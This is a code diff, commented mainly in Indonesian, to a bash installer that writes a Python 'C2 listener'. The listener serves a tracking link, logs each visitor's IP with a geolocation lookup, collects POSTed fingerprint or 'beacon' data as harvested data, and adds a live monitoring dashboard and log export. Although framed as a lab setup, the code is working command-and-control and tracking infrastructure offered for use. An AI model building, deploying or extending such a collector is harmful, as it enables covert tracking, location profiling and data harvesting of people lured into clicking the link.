@@ -40,10 +40,103 @@ import urllib.request
 import json
 import ipaddress
 import os
+import socket
 from datetime import datetime
 
-PORT = 8080
-LOG_DIR = "./received_logs"
+PORT = int(os.environ.get("C2_PORT", "8080"))
+LOG_DIR = os.environ.get("C2_LOG_DIR", "./received_logs")
+DASH_PASS = os.environ.get("C2_DASH_PASS", "")
+
+EVENTS_FILE = os.path.join(LOG_DIR, "events.jsonl")
+DASHBOARD_PATH = "/dashboard"
+API_EVENTS_PATH = "/api/events"
+EXPORT_PATH = "/export"
+
+events = []
+loc_cache = {}
+
+
+def emit(text):
+    print(text, flush=True)
+
+
+def now_str():
+    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+
+def file_ts():
+    return datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+
+
+def local_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        return "127.0.0.1"
+
+
+def load_events():
+    if not os.path.exists(EVENTS_FILE):
+        return
+    try:
+        with open(EVENTS_FILE, "r", encoding="utf-8") as f:
+            for line in f:
+                line = line.strip()
+                if not line:
+                    continue
+                try:
+                    events.append(json.loads(line))
+                except ValueError:
+                    pass
+    except Exception:
+        pass
+
+
+def record_event(ev):
+    events.append(ev)
+    try:
+        with open(EVENTS_FILE, "a", encoding="utf-8") as f:
+            f.write(json.dumps(ev, ensure_ascii=False) + "\n")
+    except Exception as e:
+        emit(f" [!] Gagal menulis events.jsonl: {e}")
+
+
+def _geolocate(client_ip):
+    try:
+        addr = ipaddress.ip_address(client_ip)
+    except ValueError:
+        return f"IP tidak valid: {client_ip}"
+    if addr.is_private:
+        return "Local network (IP privat, tidak bisa di-geolocate)"
+    if addr.is_link_local or addr.is_reserved:
+        return "Alamat reserved/link-local (tidak bisa di-geolocate)"
+    try:
+        start = int(ipaddress.ip_address("100.64.0.0"))
+        end = int(ipaddress.ip_address("100.127.255.255"))
+        if start <= int(addr) <= end:
+            return "VPN/CGNAT (100.64.0.0/10, tidak bisa di-geolocate)"
+    except ValueError:
+        pass
+    try:
+        url = f"http://ip-api.com/json/{client_ip}?fields=status,country,regionName,city,lat,lon,isp,query"
+        with urllib.request.urlopen(url, timeout=8) as resp:
+            info = json.loads(resp.read().decode("utf-8"))
+        if info.get("status") == "success":
+            return f"{info.get('city')}, {info.get('regionName')}, {info.get('country')} ({info.get('lat')}, {info.get('lon')}) - ISP: {info.get('isp')}"
+        return f"Gagal lookup: {info.get('message', 'no message')}"
+    except Exception as e:
+        return f"Error lookup: {e}"
+
+
+def geolocate(client_ip):
+    if client_ip not in loc_cache:
+        loc_cache[client_ip] = _geolocate(client_ip)
+    return loc_cache[client_ip]
+
 
 TRACKER_PAGE = """<!DOCTYPE html>
 <html lang="id">
@@ -82,96 +175,227 @@ sendFingerprint();
 </body>
 </html>"""
 
+DASHBOARD_PAGE = """<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>C2 Monitor - Dashboard</title>
+<style>
+body { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; background:#0f172a; color:#e2e8f0; margin:0; padding:24px; }
+h1 { font-size:20px; margin:0 0 4px; }
+.sub { color:#94a3b8; font-size:12px; margin-bottom:20px; }
+.stats { display:flex; gap:12px; flex-wrap:wrap; margin-bottom:20px; }
+.card { background:#1e293b; border:1px solid #334155; border-radius:8px; padding:14px 20px; min-width:120px; }
+.card .n { font-size:26px; font-weight:700; color:#38bdf8; }
+.card .l { font-size:11px; color:#94a3b8; text-transform:uppercase; letter-spacing:.06em; }
+table { width:100%; border-collapse:collapse; background:#1e293b; border-radius:8px; overflow:hidden; }
+th, td { text-align:left; padding:10px 12px; font-size:13px; border-bottom:1px solid #334155; vertical-align:top; }
+th { background:#0b1220; color:#94a3b8; font-size:11px; text-transform:uppercase; }
+tr:hover td { background:#24324a; }
+.badge { padding:2px 8px; border-radius:999px; font-size:11px; white-space:nowrap; }
+.b-click { background:#3b2f0a; color:#facc15; }
+.b-data { background:#0f3a2e; color:#34d399; }
+.detail { max-width:420px; word-break:break-all; color:#cbd5e1; font-size:12px; }
+a { color:#38bdf8; }
+</style>
+</head>
+<body>
+<h1>C2 Monitor</h1>
+<div class="sub" id="sub">Memuat...</div>
+<div class="stats">
+<div class="card"><div class="n" id="sTotal">0</div><div class="l">Total Event</div></div>
+<div class="card"><div class="n" id="sClick">0</div><div class="l">Klik Link</div></div>
+<div class="card"><div class="n" id="sData">0</div><div class="l">Paket Data</div></div>
+<div class="card"><div class="n" id="sIP">0</div><div class="l">IP Unik</div></div>
+<div class="card"><div class="n" id="sLast">-</div><div class="l">Aktivitas Terakhir</div></div>
+</div>
+<table>
+<thead><tr><th>Waktu</th><th>Jenis</th><th>IP</th><th>ID</th><th>Lokasi</th><th>Detail</th></tr></thead>
+<tbody id="rows"></tbody>
+</table>
+<div class="sub" style="margin-top:16px">Auto-refresh 3 detik. Menampilkan 100 event terbaru. <a id="exportLink" href="/export">Export semua log</a></div>
+<script>
+var Q = location.search;
+function esc(s) {
+    return String(s == null ? "" : s).replace(/[&<>"']/g, function(c) {
+        return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c];
+    });
+}
+async function refresh() {
+    try {
+        var r = await fetch("/api/events" + Q);
+        if (!r.ok) { document.getElementById("sub").textContent = "Akses ditolak / pass salah"; return; }
+        var ev = await r.json();
+        render(ev);
+    } catch(e) { document.getElementById("sub").textContent = "Server belum merespon..."; }
+}
+function render(ev) {
+    document.getElementById("sub").textContent = "Terkoneksi - " + ev.length + " event";
+    document.getElementById("sTotal").textContent = ev.length;
+    var clicks = 0, datas = 0, ips = {}, last = ev.length ? ev[0].time : "-";
+    for (var i = 0; i < ev.length; i++) {
+        if (ev[i].type === "click") clicks++; else datas++;
+        ips[ev[i].ip] = 1;
+    }
+    document.getElementById("sClick").textContent = clicks;
+    document.getElementById("sData").textContent = datas;
+    document.getElementById("sIP").textContent = Object.keys(ips).length;
+    document.getElementById("sLast").textContent = last;
+    var rows = document.getElementById("rows");
+    rows.innerHTML = "";
+    var slice = ev.slice(0, 100);
+    for (var j = 0; j < slice.length; j++) {
+        var e = slice[j];
+        var badge = e.type === "click" ? '<span class="badge b-click">Klik</span>' : '<span class="badge b-data">Data</span>';
+        var detail = "";
+        if (e.type === "click") {
+            detail = "Path: " + esc(e.path);
+        } else {
+            try { detail = esc(JSON.stringify(e.detail).slice(0, 300)); }
+            catch(x) { detail = esc(String(e.detail)); }
+        }
+        var tr = document.createElement("tr");
+        tr.innerHTML = "<td>" + esc(e.time) + "</td><td>" + badge + "</td><td>" + esc(e.ip) + "</td><td>" + esc(e.id) + "</td><td>" + esc(e.location) + "</td><td class='detail'>" + detail + "</td>";
+        rows.appendChild(tr);
+    }
+}
+document.getElementById("exportLink").href = "/export" + Q;
+refresh();
+setInterval(refresh, 3000);
+</script>
+</body>
+</html>"""
+
+
 class C2Handler(http.server.BaseHTTPRequestHandler):
 
-    def geolocate(self, client_ip):
-        try:
-            if ipaddress.ip_address(client_ip).is_private:
-                return "Local network (private IP, cannot be geolocated)"
-        except ValueError:
-            pass
-        try:
-            url = "http://ip-api.com/json/{0}?fields=status,country,regionName,city,lat,lon,isp,query".format(client_ip)
-            with urllib.request.urlopen(url, timeout=8) as resp:
-                info = json.loads(resp.read().decode("utf-8"))
-            if info.get("status") == "success":
-                return "{0}, {1}, {2} ({3}, {4}) - ISP: {5}".format(
-                    info.get("city"), info.get("regionName"), info.get("country"),
-                    info.get("lat"), info.get("lon"), info.get("isp"))
-            return "Location lookup failed: {0}".format(info.get("message", "unknown"))
-        except Exception as e:
-            return "Location lookup error: {0}".format(e)
+    def _send(self, code, ctype, body, extra_headers=None):
+        self.send_response(code)
+        self.send_header("Content-type", ctype)
+        if extra_headers:
+            for k, v in extra_headers:
+                self.send_header(k, v)
+        self.end_headers()
+        self.wfile.write(body)
+
+    def _auth_ok(self, query):
+        if not DASH_PASS:
+            return True
+        return query.get("pass", [""])[0] == DASH_PASS
 
     def do_GET(self):
-        client_ip = self.client_address[0]
-        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
         parsed = urllib.parse.urlparse(self.path)
         query = urllib.parse.parse_qs(parsed.query)
-        tracking_id = query.get("id", ["-"])[0]
-        location = self.geolocate(client_ip)
+        path = parsed.path
 
-        print(f"\n[+] Link clicked from IP: {client_ip} | Time: {timestamp} | ID: {tracking_id}")
-        print(f"    Path: {parsed.path} | Location: {location}")
-        print("--------------------------------------------------")
+        if path in (DASHBOARD_PATH, API_EVENTS_PATH, EXPORT_PATH):
+            if not self._auth_ok(query):
+                self._send(401, "text/plain; charset=utf-8", b"Akses ditolak: pass salah")
+                return
+            if path == DASHBOARD_PATH:
+                self._send(200, "text/html; charset=utf-8", DASHBOARD_PAGE.encode("utf-8"))
+            elif path == API_EVENTS_PATH:
+                body = json.dumps(list(reversed(events)), ensure_ascii=False).encode("utf-8")
+                self._send(200, "application/json; charset=utf-8", body, [("Cache-Control", "no-store")])
+            else:
+                lines = [json.dumps(e, ensure_ascii=False) for e in reversed(events)]
+                body = ("\n".join(lines) + "\n").encode("utf-8")
+                self._send(200, "text/plain; charset=utf-8", body,
+                           [("Content-Disposition", 'attachment; filename="logs.txt"')])
+            return
 
-        filename = os.path.join(LOG_DIR, f"click_{client_ip}_{timestamp}.log")
-        with open(filename, "w", encoding="utf-8") as f:
-            f.write(f"IP: {client_ip}\nTime: {timestamp}\nPath: {parsed.path}\nID: {tracking_id}\nLocation: {location}\n")
-        print(f" [+] Saved click report to: {filename}")
-
-        self.send_response(200)
-        self.send_header("Content-type", "text/html; charset=utf-8")
-        self.end_headers()
-        self.wfile.write(TRACKER_PAGE.encode("utf-8"))
+        client_ip = self.client_address[0]
+        t = now_str()
+        tracking_id = query.get("id", [""])[0] or "-"
+        location = geolocate(client_ip)
+        fname = os.path.join(LOG_DIR, f"click_{client_ip}_{file_ts()}.log")
+        content = f"IP: {client_ip}\nWaktu: {t}\nPath: {parsed.path}\nID: {tracking_id}\nLokasi: {location}\n"
+        try:
+            with open(fname, "w", encoding="utf-8") as f:
+                f.write(content)
+        except Exception as e:
+            emit(f" [!] Gagal simpan file: {e}")
+        record_event({
+            "time": t, "type": "click", "ip": client_ip, "id": tracking_id,
+            "path": parsed.path, "location": location, "file": fname
+        })
+        emit("=" * 60)
+        emit(" [+] LINK DIKLIK")
+        emit(f"     Waktu : {t}")
+        emit(f"     IP    : {client_ip}")
+        emit(f"     ID    : {tracking_id}")
+        emit(f"     Lokasi: {location}")
+        emit(f"     Path  : {parsed.path}")
+        emit(f"     File  : {fname}")
+        emit("=" * 60)
+        self._send(200, "text/html; charset=utf-8", TRACKER_PAGE.encode("utf-8"))
 
     def do_POST(self):
         try:
             content_length = int(self.headers.get("Content-Length", 0))
             post_data = self.rfile.read(content_length).decode("utf-8", errors="ignore")
-
             parsed_data = urllib.parse.parse_qs(post_data)
             data_payload = parsed_data.get("data", [""])[0]
-
             if not data_payload:
                 data_payload = post_data
-
             client_ip = self.client_address[0]
-            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-
-            print(f"\n[+] Incoming data packet from IP: {client_ip} | Time: {timestamp}")
-            print("--------------------------------------------------")
-            print(f"{data_payload}")
-            print("--------------------------------------------------")
-
-            filename = os.path.join(LOG_DIR, f"{client_ip}_{timestamp}.log")
-            with open(filename, "w", encoding="utf-8") as f:
+            t = now_str()
+            fname = os.path.join(LOG_DIR, f"{client_ip}_{file_ts()}.log")
+            with open(fname, "w", encoding="utf-8") as f:
                 f.write(data_payload)
-            print(f" [+] Successfully saved payload to: {filename}")
-
-            self.send_response(200)
-            self.send_header("Content-type", "text/plain")
-            self.end_headers()
-            self.wfile.write(b"ACK")
-
+            try:
+                detail = json.loads(data_payload)
+            except ValueError:
+                detail = data_payload
+            record_event({
+                "time": t, "type": "data", "ip": client_ip, "id": "beacon",
+                "path": "/", "location": geolocate(client_ip), "detail": detail, "file": fname
+            })
+            emit("=" * 60)
+            emit(" [+] PAKET DATA DITERIMA")
+            emit(f"     Waktu : {t}")
+            emit(f"     IP    : {client_ip}")
+            emit(f"     File  : {fname}")
+            emit("     Isi   :")
+            emit(f"     {data_payload}")
+            emit("=" * 60)
+            self._send(200, "text/plain; charset=utf-8", b"ACK")
         except Exception as e:
-            print(f" [!] Error processing request: {e}")
-            self.send_response(500)
-            self.end_headers()
+            emit(f" [!] Error memproses request: {e}")
+            self._send(500, "text/plain; charset=utf-8", b"Error")
 
     def log_message(self, format, *args):
         return
 
-if __name__ == "__main__":
+
+def main():
+    os.makedirs(LOG_DIR, exist_ok=True)
+    load_events()
     server_address = ("", PORT)
     httpd = http.server.HTTPServer(server_address, C2Handler)
-    print(f"\n[*] C2 Listener successfully bound to port {PORT}")
-    print(f"[*] Storing harvested data inside: {os.path.abspath(LOG_DIR)}")
-    print(f"[*] Press Ctrl+C to terminate the server.\n")
+    ip = local_ip()
+    emit("")
+    emit("[*] C2 Listener berjalan di port %d" % PORT)
+    emit("[*] Folder log: %s" % os.path.abspath(LOG_DIR))
+    emit("")
+    emit("[*] LINK PELACAK (kirim ke mesin lab):")
+    emit("    http://%s:%d/?id=lab-1" % (ip, PORT))
+    emit("")
+    emit("[*] DASHBOARD MONITORING (buka di browser):")
+    suffix = "?pass=xxx" if DASH_PASS else ""
+    emit("    http://%s:%d/dashboard%s" % (ip, PORT, suffix))
+    emit("")
+    emit("[*] Tekan Ctrl+C untuk menghentikan server.")
     try:
         httpd.serve_forever()
     except KeyboardInterrupt:
-        print("\n[*] Shutting down C2 server gracefully...")
+        emit("\n[*] Server dihentikan.")
         httpd.server_close()
+
+
+if __name__ == "__main__":
+    main()
 EOF
 
 chmod +x "$SCRIPT_NAME"
@@ -230,11 +454,13 @@ echo " [1] Tracking link - READY TO SEND to Windows lab machine:"
 echo "     http://${SERVER_IP}:${PORT}/?id=lab-1"
 echo "     (opsional: ganti 'lab-1' dengan nama unik mesin, misal ?id=win-lab-2)"
 echo ""
-echo " [2] Start listener again later with:"
+echo " [2] Dashboard monitoring (buka di browser):"
+echo "     http://${SERVER_IP}:${PORT}/dashboard"
+echo ""
+echo " [3] Start listener again later with:"
 echo "     python3 -u $SCRIPT_NAME"
 echo ""
-echo " [3] If server is a cloud VM, also allow port $PORT in the cloud"
-echo "     security group / network firewall."
+echo " [4] Jika server adalah VM cloud, buka port $PORT di security group."
 echo "=================================================================="
 
 echo " [*] Starting C2 listener on port $PORT (Ctrl+C to stop)..."
